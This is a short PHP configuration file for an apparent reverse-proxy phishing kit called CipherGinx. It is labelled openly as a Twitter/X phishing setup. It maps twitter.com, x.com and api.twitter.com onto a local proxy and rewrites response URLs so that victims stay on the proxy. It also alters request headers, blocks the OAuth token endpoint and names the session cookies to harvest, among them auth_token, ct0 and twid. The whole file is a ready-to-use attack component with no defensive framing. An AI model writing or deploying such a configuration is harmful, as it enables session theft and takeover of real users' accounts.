<?php
// CipherGinx PHP - Twitter/X Phishing Configuration
// Targets Twitter/X login and authentication

return [
    'hostname' => 'twitter.com',
    'isSSL' => true,
    'server' => 'localhost',
    'port' => 443,

    'inject_domain' => [
        ['twitter.com', 'localhost'],
        ['x.com', 'localhost'],
        ['api.twitter.com', 'api.localhost'],
    ],

    'req_headers' => [
        ['', ['Connection' => 'close']],
        ['/i/api/', ['X-Client-Transaction-ID' => 'MODIFIED']],
    ],

    'resp_headers' => [
        ['', []],
    ],

    'req_body' => [],

    'resp_body' => [
        ['', 'https://twitter.com', 'https://localhost'],
        ['', 'https://x.com', 'https://localhost'],
    ],

    'block_paths' => [
        '/i/api/2/oauth2/token',
    ],

    'get_cookie' => [
        'auth_token',
        'ct0',
        'personalization_id',
        'gt',
        '_twitter_sess',
        'lang',
        'twid',
    ],
];
